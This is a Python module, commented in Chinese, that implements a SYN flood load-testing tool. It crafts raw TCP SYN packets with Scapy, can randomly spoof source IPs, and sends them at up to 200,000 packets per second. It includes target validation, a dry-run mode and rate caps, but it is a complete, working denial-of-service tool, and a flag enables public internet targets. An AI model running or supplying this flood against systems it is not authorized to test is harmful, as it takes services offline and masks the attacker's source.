# -*- coding: utf-8 -*-
"""
SYN Flood 测试
==============

用原始套接字发半开 TCP 连接（只发 SYN，不完成三次握手），观察目标的
SYN backlog / 连接表能不能扛住。**这是压测工具，只能用于你本人拥有或
已获书面授权的目标。**

安全设计（不是走过场）：

* 默认只接受私有 / 链路本地地址，公网目标必须显式 `allow_public=True`；
* 拒绝组播、广播、回环、保留地址；
* 发包速率有上限，停止用独立 Event，可以随时中断；
* 支持 `dry_run`：只构造包不发送，自检和演练用它；
* 发包统一走 `core.rawsock.send_packets`，每条都带 `Ether(src=...)`。

核心层零 Qt，界面只负责收参数、起停、看统计。
"""

from __future__ import annotations

import ipaddress
import random
import threading
import time
from dataclasses import dataclass, field

from . import rawsock
from .logging_bus import log

MAX_RATE = 200000          # 每秒最多 20 万个包，再高就不是测试而是自残了
MAX_DURATION = 600.0       # 单次最长 10 分钟
MAX_COUNT = 5_000_000
DEFAULT_BATCH = 32
PRESETS = {"HTTP": 80, "HTTPS": 443, "SSH": 22, "RDP": 3389,
           "DNS": 53, "MySQL": 3306, "Redis": 6379}

SPOOF_NETS = ["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"]


@dataclass
class FloodStats:
    sent: int = 0
    failed: int = 0
    nbytes: int = 0
    started: float = 0.0
    finished: float = 0.0
    errors: list = field(default_factory=list)

    def reset(self) -> None:
        self.sent = 0
        self.failed = 0
        self.nbytes = 0
        self.started = 0.0
        self.finished = 0.0
        self.errors = []

    def add(self, sent: int = 0, failed: int = 0, nbytes: int = 0) -> None:
        self.sent += max(0, int(sent))
        self.failed += max(0, int(failed))
        self.nbytes += max(0, int(nbytes))

    def note_error(self, text: str) -> None:
        self.errors.append(text)
        if len(self.errors) > 20:
            del self.errors[:-20]

    @property
    def elapsed(self) -> float:
        if not self.started:
            return 0.0
        end = self.finished or time.time()
        return max(0.0, end - self.started)

    def snapshot(self, running: bool = False) -> dict:
        span = self.elapsed
        pps = self.sent / span if span > 0.2 else 0.0
        return {
            "sent": self.sent, "failed": self.failed,
            "bytes": self.nbytes, "elapsed": round(span, 1),
            "pps": round(pps, 1),
            "mbps": round(self.nbytes * 8 / span / 1_000_000, 2) if span > 0.2 else 0.0,
            "running": running,
            "errors": list(self.errors[-5:]),
        }


def validate_target(ip: str, port: int, allow_public: bool = False) -> tuple[bool, str]:
    """检查目标是否允许拿来压测。"""
    try:
        addr = ipaddress.ip_address((ip or "").strip())
    except ValueError:
        return False, f"不是合法的 IPv4 地址：{ip!r}"
    if addr.version != 4:
        return False, "只支持 IPv4"
    if addr.is_multicast:
        return False, "组播地址不能作为目标"
    if addr.is_unspecified or addr.is_reserved:
        return False, "未指定 / 保留地址不能作为目标"
    if str(addr) == "255.255.255.255" or str(addr).endswith(".255"):
        return False, "广播地址不能作为目标"
    if addr.is_loopback:
        return False, "回环地址收不到 Npcap 原始包，请选真实网卡与目标"
    if not (addr.is_private or addr.is_link_local) and not allow_public:
        return False, ("默认只允许私有 / 链路本地地址。公网目标请先确认你有书面授权，"
                       "再勾选「允许公网目标」")
    if not 1 <= int(port) <= 65535:
        return False, f"端口必须在 1-65535：{port}"
    return True, "ok"


def resolve_dst_mac(target: str, iface) -> str:
    """解析目标 MAC；跨网段时退回网关 MAC。"""
    l2 = getattr(iface, "l2_name", "") or ""
    try:
        from . import arpmitm
        mac = arpmitm.resolve_mac(target, l2)
        if mac:
            return mac
        gateway = getattr(iface, "gateway", "") or ""
        if gateway and gateway != target:
            mac = arpmitm.resolve_mac(gateway, l2)
            if mac:
                return mac
    except Exception as exc:
        log(f"解析目标 MAC 失败：{type(exc).__name__}: {exc}", "debug", "synflood")
    return ""


def build_syn_packet(target: str, port: int, src_ip: str, src_port: int,
                     src_mac: str, dst_mac: str, seq: int = 0,
                     window: int = 64240, ttl: int = 64,
                     payload: bytes = b""):
    """构造一个带 Ether 头的 SYN 包（必须带 src MAC，否则 Npcap 会拒发）。"""
    if not src_mac:
        raise ValueError("缺少源 MAC：请选择一张有 MAC 的网卡")
    if not dst_mac:
        raise ValueError("缺少目标 MAC：请先解析目标或填写网关 MAC")
    from scapy.all import Ether, IP, Raw, TCP

    pkt = (Ether(src=src_mac, dst=dst_mac)
           / IP(src=src_ip, dst=target, ttl=ttl)
           / TCP(sport=int(src_port), dport=int(port), flags="S",
                 seq=int(seq) & 0xFFFFFFFF, window=int(window)))
    if payload:
        pkt = pkt / Raw(payload)
    return pkt


def probe_syn(target: str, port: int, iface, dst_mac: str = "",
              timeout: float = 1.5) -> tuple[bool, str]:
    """先发一个 SYN，确认链路、MAC 和端口状态。开打前强烈建议跑一次。"""
    mac = dst_mac or resolve_dst_mac(target, iface)
    if not mac:
        return False, "解析不到目标 MAC（检查网段 / 网关 / ARP）"
    try:
        pkt = build_syn_packet(
            target, port, getattr(iface, "ip", ""), random.randint(20000, 60000),
            getattr(iface, "mac", ""), mac,
            seq=random.randint(0, 0xFFFFFFFF))
    except Exception as exc:
        return False, f"构造 SYN 失败：{exc}"

    ans, _unans = rawsock.srp_locked(pkt, getattr(iface, "l2_name", "") or "",
                                     timeout=timeout)
    for _sent, rcv in ans:
        try:
            if rcv.haslayer("TCP"):
                flags = int(rcv["TCP"].flags)
                if flags & 0x12 == 0x12:
                    return True, f"收到 SYN+ACK：{target}:{port} 端口开放"
                if flags & 0x04:
                    return False, f"收到 RST：{target}:{port} 端口关闭"
        except Exception:
            continue
    return False, f"没有收到响应：{target}:{port}（端口过滤 / 目标不可达 / MAC 不对）"


def _random_spoof_ip() -> str:
    net = ipaddress.ip_network(random.choice(SPOOF_NETS))
    base = int(net.network_address)
    size = net.num_addresses
    return str(ipaddress.ip_address(base + random.randint(1, size - 2)))


class SynFlood:
    """单发送线程 + 批量发包。rawsock 内部已串行化，多线程不会更快。"""

    def __init__(self, target: str, port: int, iface, dst_mac: str = "",
                 src_mode: str = "local", src_ip: str = "",
                 rate: int = 0, duration: float = 10.0, count: int = 0,
                 batch: int = DEFAULT_BATCH, allow_public: bool = False,
                 dry_run: bool = False):
        self.target = (target or "").strip()
        self.port = int(port)
        self.iface = iface
        self.dst_mac = (dst_mac or "").strip().lower()
        self.src_mode = (src_mode or "local").lower()
        self.src_ip = (src_ip or "").strip()
        self.rate = max(0, min(int(rate or 0), MAX_RATE))
        self.duration = max(0.0, min(float(duration or 0.0), MAX_DURATION))
        self.count = max(0, min(int(count or 0), MAX_COUNT))
        self.batch = max(1, min(int(batch or DEFAULT_BATCH), 512))
        self.allow_public = bool(allow_public)
        self.dry_run = bool(dry_run)

        self.stats = FloodStats()
        self._stop_evt = threading.Event()
        self._thread: threading.Thread | None = None
        self._pkt_len = 54
        self._local_ip = getattr(iface, "ip", "") or ""
        self._src_mac = getattr(iface, "mac", "") or ""
        self._l2 = getattr(iface, "l2_name", "") or ""

    # ---------------- 校验 ----------------

    def check(self) -> tuple[bool, str]:
        ok, why = validate_target(self.target, self.port, self.allow_public)
        if not ok:
            return ok, why
        if self.iface is None:
            return False, "没有选择网卡"
        if not self._src_mac:
            return False, "网卡没有 MAC 地址，无法构造以太网头"
        if not self._l2 and not self.dry_run:
            return False, "网卡没有 Npcap 设备名，请用管理员身份重启"
        if self.src_mode == "custom" and not self.src_ip:
            return False, "自定义源 IP 为空"
        if self.src_mode == "local" and not self._local_ip:
            return False, "网卡没有 IPv4 地址"
        if self.src_mode == "custom":
            try:
                ipaddress.ip_address(self.src_ip)
            except ValueError:
                return False, f"自定义源 IP 不合法：{self.src_ip}"
        if not self.dst_mac:
            return False, "还没有解析到目标 MAC，请点「解析目标 MAC」"
        return True, "ok"

    # ---------------- 生命周期 ----------------

    def start(self) -> bool:
        if self.is_running():
            return False
        ok, why = self.check()
        if not ok:
            log(f"SYN Flood 启动被拒绝：{why}", "error", "synflood")
            return False
        self._stop_evt.clear()
        self.stats.reset()
        self.stats.started = time.time()
        self._pkt_len = 54
        self._thread = threading.Thread(target=self._loop, name="synflood",
                                        daemon=True)
        self._thread.start()
        log(f"SYN Flood 已启动：{self.target}:{self.port} / "
            f"{'随机源 IP' if self.src_mode == 'random' else ('源 ' + (self.src_ip or self._local_ip))}"
            + (f" / 限速 {self.rate} pps" if self.rate else " / 不限速")
            + (f" / 限时 {self.duration:g}s" if self.duration else "")
            + ("（演练模式，不实际发包）" if self.dry_run else ""),
            "warn", "synflood")
        return True

    def stop(self, timeout: float = 5.0) -> None:
        self._stop_evt.set()
        thread = self._thread
        if thread is not None and thread.is_alive():
            thread.join(max(0.5, timeout))
        self._thread = None
        if not self.stats.finished:
            self.stats.finished = time.time()
        snap = self.stats.snapshot(False)
        log(f"SYN Flood 已停止：发送 {snap['sent']} 个包，"
            f"失败 {snap['failed']}，平均 {snap['pps']} pps", "info", "synflood")

    def is_running(self) -> bool:
        return bool(self._thread is not None and self._thread.is_alive())

    def snapshot(self) -> dict:
        snap = self.stats.snapshot(self.is_running())
        snap.update({"target": self.target, "port": self.port,
                     "rate": self.rate, "duration": self.duration,
                     "count": self.count, "dry_run": self.dry_run,
                     "dst_mac": self.dst_mac, "src_mode": self.src_mode})
        return snap

    # ---------------- 发送 ----------------

    def _source_ip(self) -> str:
        if self.src_mode == "random":
            return _random_spoof_ip()
        if self.src_mode == "custom":
            return self.src_ip
        return self._local_ip

    def build_packet(self):
        return build_syn_packet(
            self.target, self.port, self._source_ip(),
            random.randint(1024, 65535), self._src_mac, self.dst_mac,
            seq=random.randint(0, 0xFFFFFFFF))

    def _loop(self) -> None:
        stop = self._stop_evt
        deadline = (time.time() + self.duration) if self.duration else 0.0
        interval = (self.batch / float(self.rate)) if self.rate else 0.0
        next_tick = time.time()
        try:
            while not stop.is_set():
                if self.count and self.stats.sent >= self.count:
                    break
                if deadline and time.time() >= deadline:
                    break
                size = self.batch
                if self.count:
                    size = min(size, self.count - self.stats.sent)
                if size <= 0:
                    break

                if self.dry_run:
                    try:
                        pkt = self.build_packet()
                        self._pkt_len = len(bytes(pkt))
                    except Exception as exc:
                        self.stats.note_error(f"{type(exc).__name__}: {exc}")
                        break
                    ok = size
                else:
                    try:
                        pkts = [self.build_packet() for _ in range(size)]
                    except Exception as exc:
                        self.stats.note_error(f"{type(exc).__name__}: {exc}")
                        break
                    ok = rawsock.send_packets(pkts, self._l2)
                    if ok < size:
                        self.stats.note_error(f"本批只发出 {ok}/{size} 个包")

                self.stats.add(sent=ok, failed=max(0, size - ok),
                               nbytes=ok * self._pkt_len)

                if interval > 0:
                    next_tick += interval
                    delay = next_tick - time.time()
                    if delay > 0:
                        stop.wait(delay)          # 可被 stop() 立刻打断
                    else:
                        next_tick = time.time()
        except Exception as exc:
            self.stats.note_error(f"{type(exc).__name__}: {exc}")
            log(f"SYN Flood 发送线程异常：{type(exc).__name__}: {exc}",
                "error", "synflood")
        finally:
            self.stats.finished = time.time()


def estimate(batch: int, rate: int) -> dict:
    """给界面显示的粗略估算。"""
    batch = max(1, int(batch or 1))
    rate = max(0, int(rate or 0))
    pps = rate if rate else None
    pkt_len = 54
    return {
        "pps": pps,
        "mbps": round((pps or 0) * pkt_len * 8 / 1_000_000, 2) if pps else 0.0,
        "batch": batch,
        "interval_ms": round(batch / rate * 1000, 1) if rate else 0.0,
    }
